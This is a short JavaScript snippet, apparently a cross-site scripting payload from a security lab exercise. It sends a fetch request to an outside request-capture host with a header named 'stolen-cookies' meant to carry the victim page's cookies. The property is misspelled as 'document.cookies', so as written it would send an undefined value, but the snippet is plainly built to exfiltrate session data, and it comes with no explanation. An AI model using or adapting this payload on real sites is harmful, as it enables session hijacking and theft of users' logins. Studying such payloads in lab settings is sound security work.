fetch('https://labkevinf.free.beeceptor.com/', {
  method: 'GET',
  headers: {
    'stolen-cookies': document.cookies,
  },
})
  .then(response => response.json())
  .then(response => console.log(response))
  .catch(err => console.error(err));
